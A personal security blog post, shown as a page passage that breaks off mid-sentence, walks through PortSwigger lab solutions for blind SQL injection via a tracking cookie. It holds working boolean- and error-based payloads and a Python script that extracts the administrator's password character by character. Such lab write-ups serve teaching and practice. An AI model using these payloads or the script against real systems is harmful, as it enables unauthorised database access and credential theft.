<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="Blind SQL Injection" /><meta name="author" content="kill5witch" /><meta property="og:locale" content="en" /><meta name="description" content="Intro Lab at portswigger: Blind SQL Injection" /><meta property="og:description" content="Intro Lab at portswigger: Blind SQL Injection" /><link rel="canonical" href="https://an9k0r.github.io/posts/Blind_SQL_Injection/" /><meta property="og:url" content="https://an9k0r.github.io/posts/Blind_SQL_Injection/" /><meta property="og:site_name" content="CyberSec-Research.Space" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-09-30T09:00:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Blind SQL Injection" /><meta name="twitter:site" content="@cybersec_space" /><meta name="twitter:creator" content="@kill5witch" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"kill5witch"},"description":"Intro Lab at portswigger: Blind SQL Injection","headline":"Blind SQL Injection","dateModified":"2023-12-03T07:34:49+01:00","url":"https://an9k0r.github.io/posts/Blind_SQL_Injection/","datePublished":"2022-09-30T09:00:00+02:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://an9k0r.github.io/posts/Blind_SQL_Injection/"},"@context":"https://schema.org"}</script><title>Blind SQL Injection | CyberSec-Research.Space</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="CyberSec-Research.Space"><meta name="application-name" content="CyberSec-Research.Space"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/images/logo.jpeg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">CyberSec-Research.Space</a></div><div class="site-subtitle font-italic">Information Security Personal Blog</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/blogging/" class="nav-link"> <i class="fa-fw fas fa-book ml-xl-3 mr-xl-3 unloaded"></i> <span>BLOGS AND GUIDES</span> </a><li class="nav-item"> <a href="/hack_the_box/" class="nav-link"> <i class="fa-fw fas fa-bug ml-xl-3 mr-xl-3 unloaded"></i> <span>HACK THE BOX</span> </a><li class="nav-item"> <a href="/blue_team_ctf/" class="nav-link"> <i class="fa-fw fas fa-anchor ml-xl-3 mr-xl-3 unloaded"></i> <span>BLUE TEAM CTFS</span> </a><li class="nav-item"> <a href="/web_application/" class="nav-link"> <i class="fa-fw fas fa-terminal ml-xl-3 mr-xl-3 unloaded"></i> <span>WEB APPLICATION</span> </a><li class="nav-item"> <a href="/binary_exploitation/" class="nav-link"> <i class="fa-fw fas fa-microchip ml-xl-3 mr-xl-3 unloaded"></i> <span>BINARY EXPLOITATION</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/an9k0r" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/cybersec_space" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Blind SQL Injection</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 694 515'%3E%3C/svg%3E" data-src="/assets/images/15450b0a69849f39f9ba9259525f75e7744bfce52f2033a7ff442935539db4fd.png" class="preview-img bg" alt="image alternative text" width="694" height="515" data-proofer-ignore><h1 data-toc-skip>Blind SQL Injection</h1><div class="post-meta text-muted"><div> By <em> <a href="https://github.com/an9k0r">kill5witch</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" date="2022-09-30 09:00:00 +0200" data-toggle="tooltip" data-placement="bottom" title="Fri, Sep 30, 2022, 9:00 AM +0200" >Sep 30, 2022</em> </span> <span> Updated <em class="timeago" date="2023-12-03 07:34:49 +0100 " data-toggle="tooltip" data-placement="bottom" title="Sun, Dec 3, 2023, 7:34 AM +0100" >Dec 3</em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2741 words"> <em>15 min</em> read</span></div></div></div><div class="post-content"><h1 id="intro">Intro</h1><p>Lab at portswigger: <a href="https://portswigger.net/web-security/sql-injection/blind">Blind SQL Injection</a></p><h1 id="toc">TOC</h1><ul><li><a href="#intro">Intro</a><li><a href="#toc">TOC</a><li><a href="#blind-sql-injection-with-conditional-responses">Blind SQL injection with conditional responses</a><ul><li><a href="#intro-1">Intro</a><li><a href="#finding-the-sql-injection">Finding the SQL Injection</a><li><a href="#database-enumeration">Database Enumeration</a><ul><li><a href="#does-the-users-table-exist">Does the <code class="language-plaintext highlighter-rouge">users</code> table exist</a><li><a href="#does-the-administrator-user-exist">Does the <code class="language-plaintext highlighter-rouge">Administrator</code> user exist</a><li><a href="#does-the-administrator-exist">Does the <code class="language-plaintext highlighter-rouge">administrator</code> exist</a><li><a href="#how-long-is-the-administrators-password-is-it-longer-than-3-characters">How long is the <code class="language-plaintext highlighter-rouge">administrator</code>’s password (is it longer than 3 characters)</a><li><a href="#does-the-first-password-letter-start-with-a">Does the first password letter start with <code class="language-plaintext highlighter-rouge">"a"</code></a><li><a href="#can-we-ask-for-for-next-character-in-users-password-using-ascii-numbers-instead">Can we ask for for next character in users password using ascii (numbers) instead?</a></ul><li><a href="#automatic-solution-using-python">Automatic Solution using Python</a></ul><li><a href="#blind-sql-injection-with-conditional-errors">Blind SQL injection with conditional errors</a><ul><li><a href="#intro-2">Intro</a><li><a href="#problems-arise---missing-concatenation">Problems arise - missing concatenation</a><li><a href="#finding-password-with-burp-intruder---first-character">Finding password with Burp Intruder - first character</a><li><a href="#finding-password-with-burp-intruder---whole-password">Finding password with Burp Intruder - whole password</a><li><a href="#automating-with-python">Automating with Python</a></ul><li><a href="#blind-sql-injection-with-time-delays">Blind SQL injection with Time delays</a><ul><li><a href="#finding-blind-sqli-using-time-delay">Finding Blind SQLi using Time delay</a></ul><li><a href="#blind-sql-injection-with-time-delays-and-information-retrieval">Blind SQL injection with time delays and information retrieval</a><ul><li><a href="#intro-3">Intro</a><li><a href="#finding-the-sql-injection-1">Finding the SQL Injection</a><li><a href="#testing-yesno-condition">Testing Yes/No Condition</a><li><a href="#extracting-password-from-administrator">Extracting password from <code class="language-plaintext highlighter-rouge">administrator</code></a><ul><li><a href="#does-administrator-exist">Does <code class="language-plaintext highlighter-rouge">administrator</code> exist</a><li><a href="#what-is-the-first-character-of-administrators-password">What is the first character of <code class="language-plaintext highlighter-rouge">administrator</code>’s password</a><li><a href="#automation-with-python">Automation with Python</a></ul></ul><li><a href="#blind-sql-injection-with-out-of-band-data-exfiltration">Blind SQL injection with out-of-band data exfiltration</a><li><a href="#visible-error-based-sql-injection">Visible error-based SQL injection</a></ul><h1 id="blind-sql-injection-with-conditional-responses">Blind SQL injection with conditional responses</h1><blockquote><p>This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.</p><p>The results of the SQL query are not returned, and no error messages are displayed. But the application includes a “Welcome back” message in the page if the query returns any rows.</p><p>The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.</p></blockquote><p>To solve the lab, log in as the administrator user. We know that we have SQLi vulnerability in the <code class="language-plaintext highlighter-rouge">TrackingId</code> Cookie value. We also know that we should see “Welcome back” if query return any rows.</p><h2 id="intro-1">Intro<a href="#intro-1" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>But to get an Idea what we’re dealing with, here the website: <img data-src="/assets/images/c0cfbe9e4da91d058a81cf65297a86013252bcee6bcd181bab35e22acf0d31ea.png" alt="picture 28" data-proofer-ignore></p><p>And here the HTTP Request in BURP: <img data-src="/assets/images/0f8f665db1ad6c299f0f8fb0bc68c249747f6ad3ec6f3ffead333835e048c43d.png" alt="picture 29" data-proofer-ignore></p><p>We can observe that we can see the <code class="language-plaintext highlighter-rouge">Welcome Back!</code> in the HTTP Response and the <code class="language-plaintext highlighter-rouge">TrackingId</code> cookie.</p><h2 id="finding-the-sql-injection">Finding the SQL Injection<a href="#finding-the-sql-injection" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Now we need to see if we can inject SQL and get <code class="language-plaintext highlighter-rouge">Welcome Back!</code> message displayed using following Payload:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>TrackingId=2msRiqUVGWhY8DWK' OR 1=1 --
</pre></table></code></div></div><p><img data-src="/assets/images/69a1a83aaea350dbaa0d11edc0e275271015eab589ae5b64be582255711acfee.png" alt="picture 30" data-proofer-ignore></p><p>Yes, we do.</p><p>Now let’s try:</p><ul><li>Payload where we remove a letter from Tracking ID and have valid OR statement e.g. <code class="language-plaintext highlighter-rouge">TrackingId=2msRiqUVGWhY8DW' OR 1=1 --</code><ul><li>Result: we see <code class="language-plaintext highlighter-rouge">Welcome Back!</code> so the query is VALID.</ul><li>Payload where we remove a letter from Tracking ID and have invalid OR statement, e.g. <code class="language-plaintext highlighter-rouge">TrackingId=2msRiqUVGWhY8DW' OR 1=2 --</code><ul><li>Result: there is no <code class="language-plaintext highlighter-rouge">Welcome Back!</code> present so the query is INVALID.</ul></ul><p>We haven’t found out anything what Portswigger Web Academy hasn’t already told us, but this is how we would verify the SQL Injection vulnerability, in this case, based on output in the response.</p><p>Now let’s enumerate the database.</p><h2 id="database-enumeration">Database Enumeration<a href="#database-enumeration" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Everything we do now it’s all about finding out if Database has returned something or not. If not, our check has failed. It’s really just asking and observing YES and NO.</p><p>So let’s ask our database yes/no questions</p><h3 id="does-the-users-table-exist">Does the <code class="language-plaintext highlighter-rouge">users</code> table exist<a href="#does-the-users-table-exist" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>We can use FROM statement and compare SELECT with same string:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>TrackingId=non-existent' OR (SELECT 'a' from Users LIMIT 1)='a' --
</pre></table></code></div></div><p><img data-src="/assets/images/f998b78c783d644e258e5f393f172389fef0978fa5c77bc930521e704765ec75.png" alt="picture 32" data-proofer-ignore><br /> Result: YES</p><h3 id="does-the-administrator-user-exist">Does the <code class="language-plaintext highlighter-rouge">Administrator</code> user exist<a href="#does-the-administrator-user-exist" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>TrackingId=non-existent' OR (SELECT 'a' from Users where username='Administrator' LIMIT 1)='a' --
</pre></table></code></div></div><p>Short answer: NO</p><h3 id="does-the-administrator-exist">Does the <code class="language-plaintext highlighter-rouge">administrator</code> exist<a href="#does-the-administrator-exist" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-sql highlighter-rouge"><div class="code-header"> <span label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">TrackingId</span><span class="o">=</span><span class="n">non</span><span class="o">-</span><span class="n">existent</span><span class="s1">' OR (SELECT '</span><span class="n">a</span><span class="s1">' from Users where username='</span><span class="n">administrator</span><span class="s1">' LIMIT 1)='</span><span class="n">a</span><span class="s1">' --
</span></pre></table></code></div></div><p>Short answer: Yes it does!</p><h3 id="how-long-is-the-administrators-password-is-it-longer-than-3-characters">How long is the <code class="language-plaintext highlighter-rouge">administrator</code>’s password (is it longer than 3 characters)<a href="#how-long-is-the-administrators-password-is-it-longer-than-3-characters" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-sql highlighter-rouge"><div class="code-header"> <span label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">TrackingId</span><span class="o">=</span><span class="n">non</span><span class="o">-</span><span class="n">existent</span><span class="s1">' OR (SELECT '</span><span class="n">a</span><span class="s1">' from Users WHERE username='</span><span class="n">administrator</span><span class="s1">' AND LENGTH(password)&gt;3)='</span><span class="n">a</span><span class="s1">' --;
</span></pre></table></code></div></div><p>Short answer: Yes, password is longer then 3 characters.</p><h3 id="does-the-first-password-letter-start-with-a">Does the first password letter start with <code class="language-plaintext highlighter-rouge">"a"</code><a href="#does-the-first-password-letter-start-with-a" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-sql highlighter-rouge"><div class="code-header"> <span label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">TrackingId</span><span class="o">=</span><span class="n">non</span><span class="o">-</span><span class="n">existent</span><span class="s1">' OR (SELECT SUBSTRING(password,1,1) FROM users WHERE username='</span><span class="n">administrator</span><span class="s1">')='</span><span class="n">a</span><span class="s1">' --
</span></pre></table></code></div></div><p><img data-src="/assets/images/5a33885f550c5811585c5e22f632ea297b5b9bbd17ecf4445ed087522af0d01a.png" alt="picture 34" data-proofer-ignore></p><p>Answer: yes it does.</p><h3 id="can-we-ask-for-for-next-character-in-users-password-using-ascii-numbers-instead">Can we ask for for next character in users password using ascii (numbers) instead?<a href="#can-we-ask-for-for-next-character-in-users-password-using-ascii-numbers-instead" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>Yes we can. We’re asking for ASCII value 97.</p><p><img data-src="/assets/images/c765f2076bc9a9a1703da86113be72423de408c6f5e4cf014a6bd7ffe7ae8933.png" alt="picture 35" data-proofer-ignore></p><div class="language-sql highlighter-rouge"><div class="code-header"> <span label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">TrackingId</span><span class="o">=</span><span class="n">non</span><span class="o">-</span><span class="n">existent</span><span class="s1">' OR (ascii(substring((SELECT password FROM users WHERE username = '</span><span class="n">administrator</span><span class="s1">'),1,1)))=97 --
</span></pre></table></code></div></div><blockquote><p>So this is how we would go on when dumping the contents of the database. We would need to keep asking if that’s the character in that position etc.</p><p>This is doable with Burp Intruder, however i don’t know how to really display the password in a right way at the end. I’ve tried to do so in the next chapter, i’ve however used a script that does that for me. Anyways…</p><p>Dumping the database using Blind SQLInjection is very tedious so it’s good to know what we’re looking for exactly.</p></blockquote><h2 id="automatic-solution-using-python">Automatic Solution using Python<a href="#automatic-solution-using-python" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>As mentioned, i would use a script that i’ve used few times for that occasion (Dumping Data using SQLi). I’d search for ascii numbers rather than characters, but display them as normal characters so you can basically just copy-paste the dumped password.</p><div class="language-py highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">requests</span><span class="p">.</span><span class="n">urllib3</span><span class="p">.</span><span class="n">disable_warnings</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">inject_func</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">inj_str</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="mi">126</span><span class="p">):</span>
        <span class="c1"># now we update the sqli
</span>        <span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
        <span class="n">session</span><span class="p">.</span><span class="n">verify</span> <span class="o">=</span> <span class="bp">False</span>
        <span class="n">target</span> <span class="o">=</span> <span class="s">"%s"</span> <span class="o">%</span> <span class="p">(</span><span class="n">ip</span><span class="p">)</span>
        <span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="s">"TrackingId"</span><span class="p">:</span><span class="n">inj_str</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"[CHAR]"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">j</span><span class="p">)),</span><span class="s">"session"</span><span class="p">:</span><span class="s">"EJOTJEW5lC8QL2zIU83YdnMMEhUT8708"</span><span class="p">}</span> 
        <span class="c1">#proxies = {"http": "http://127.0.0.1:8080"}
</span>        <span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">target</span><span class="p">,</span><span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span>
        <span class="k">if</span> <span class="s">"Welcome back"</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">j</span>
    <span class="k">return</span> <span class="mi">0</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"(+) usage: %s &lt;target&gt; &lt;injection&gt;"</span> <span class="o">%</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="k">print</span><span class="p">(</span><span class="s">'(+) eg: %s 192.168.121.103 "select version()"'</span> <span class="o">%</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
    
    <span class="n">ip</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
    <span class="n">injection_parameter</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
    <span class="c1"># e.g. for injection parameter = SELECT Password FROM Users WHERE Username = 'Administrator'
</span>
    <span class="n">out</span> <span class="o">=</span> <span class="s">"(+) Retrieving "</span><span class="o">+</span> <span class="n">injection_parameter</span>
    <span class="k">print</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>
    <span class="c1">#no need to exchange spaces etc.
</span>    <span class="c1">#injection_parameter = injection_parameter.replace(" ", "/**/")
</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">25</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">i</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
            <span class="n">injection_string</span> <span class="o">=</span> <span class="s">"non-existent' OR (ascii(substring(("</span> <span class="o">+</span> <span class="n">injection_parameter</span> <span class="o">+</span> <span class="s">"),%d,1)))=[CHAR] --"</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">)</span>
            <span class="n">extracted_char</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">inject_func</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">injection_string</span><span class="p">))</span>
            <span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">extracted_char</span><span class="p">)</span>
            <span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="n">flush</span><span class="p">()</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">break</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">(+) done!"</span><span class="p">)</span>
<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</pre></table></code></div></div><p>I’ve set the length to 25 manualy, so that many character length will we checked. This could have been automated as well but some other time!</p><p>As can be seen below, password was retrieved:</p><p><img data-src="/assets/images/60e10cd6ba6fc80a8e89d22dddd99891608708b93c5d23f972dc2a2438c42425.png" alt="picture 33" data-proofer-ignore></p><p>Lab Done!</p><p><img data-src="/assets/images/cbad6719f0b40d4516d7ec5db134edd35892d4f62141d6ba18ac323bc7ecfd67.png" alt="picture 31" data-proofer-ignore></p><h1 id="blind-sql-injection-with-conditional-errors">Blind SQL injection with conditional errors</h1><h2 id="intro-2">Intro<a href="#intro-2" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>In this case the application does not react if SQL query has succeded or not, but rather we provoke an error to determine if our injected query has succeded or not. So again, we’re asking Yes/No questions.</p><p>Portswigger gives us two examples, where the first should give an error and second should succed.</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">xyz</span><span class="s1">' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE '</span><span class="n">a</span><span class="s1">' END)='</span><span class="n">a</span>
<span class="n">xyz</span><span class="s1">' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE '</span><span class="n">a</span><span class="s1">' END)='</span><span class="n">a</span>
</pre></table></code></div></div><p>Let’s first confirm that we actualy have a SQL Injection. We break an application like this: <code class="language-plaintext highlighter-rouge">TrackingId=xyz'</code> as we recieve <code class="language-plaintext highlighter-rouge">500 Internal Server Error</code>. If we can fix this, we have won.</p><p><img data-src="/assets/images/edf69813d1e8d2498ad949fa70e2d887ba64f3815d0ba971e6527b817470a681.png" alt="picture 37" data-proofer-ignore></p><ol><li><code class="language-plaintext highlighter-rouge">TrackingId=xyz' OR (SELECT 1)=1 --</code> which still returns an error, although the second OR statement should succed. Oracle DB however needs FROM or it will return an error.<li><code class="language-plaintext highlighter-rouge">TrackingId=xyz' OR (SELECT 1 from DUAL)=1 --</code> works: <img data-src="/assets/images/561035f5725e23a93e71b239deb3bf1a389a4dc0c22c5034fcf3d20d0d9559d0.png" alt="picture 38" data-proofer-ignore><li><code class="language-plaintext highlighter-rouge">TrackingId=xyz' OR (SELECT 2 FROM dual)=1 --</code> is still working.<li><code class="language-plaintext highlighter-rouge">TrackingId=xyz' OR (SELECT 2 FROM dual123)=1 --</code> doesn’t work anymore<li>Check if Table <code class="language-plaintext 